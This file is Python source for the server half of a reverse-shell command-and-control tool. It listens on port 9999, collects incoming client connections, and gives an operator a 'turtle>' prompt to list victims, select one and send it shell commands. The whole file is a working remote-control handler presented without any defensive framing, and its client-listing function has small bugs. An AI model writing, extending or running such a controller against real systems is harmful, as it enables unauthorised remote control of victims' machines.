import sys
import socket
import threading
import time
from queue import Queue



NUMBER_OF_THREADS = 2

JOB_NUMBER =[1,2] #two threads 1->listen and connect , 2->send command to connected clinets

queue = Queue() #used in thread implementation


all_connections = [] #client connections

all_address = [] #client host and port




def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("error "+ msg)
    except KeyboardInterrupt:
        sys.exit()

def bind_socket():
    try:
        global host
        global port
        global s

        print("Bindining the Port" +str(port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print(str(msg))
        bind_socket()
    

def accept_connection():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established:" + address[0])
        except:
            print("Error accepting connections")


def start_turtle():
    #cmd = input('turtle> ')
    
    while True:
        cmd = input('turtle> ')

    #list of connections
        if cmd == 'list':
            list_connections()
    
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        
        elif cmd == "":
            pass

        else:
            print("command not recogonized")
        
#t1
def list_connections():
    results= ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]  
            continue

        results = str(i)+"  "+str(all_address[i][0]) +" "+ str(all_address[i][1]) + "\n"

    print("Clients: ", "\n", results )


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("Connected to " + str(all_address[target][0]))
        print(str(all_address[target][0]), ">", end="")
        return conn

    except:
        print("Not valid selection")
        return None


#t2
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.send('q'.encode('utf-8'))
                conn.close()
                s.close()
                sys.exit()
            
            else:
                if cmd == "":
                    pass
                


            if len(cmd.encode('utf-8')) > 0:
                conn.send(cmd.encode('utf-8'))
                client_response = conn.recv(1024)
                print(client_response.decode('utf-8'), end="")
        except:
            print("error in sending commands \n")
            break




def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connection()
        if x ==2:
            start_turtle()
        
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


try:
    create_workers()
    create_jobs()

except KeyboardInterrupt as e:
    sys.exit(0)

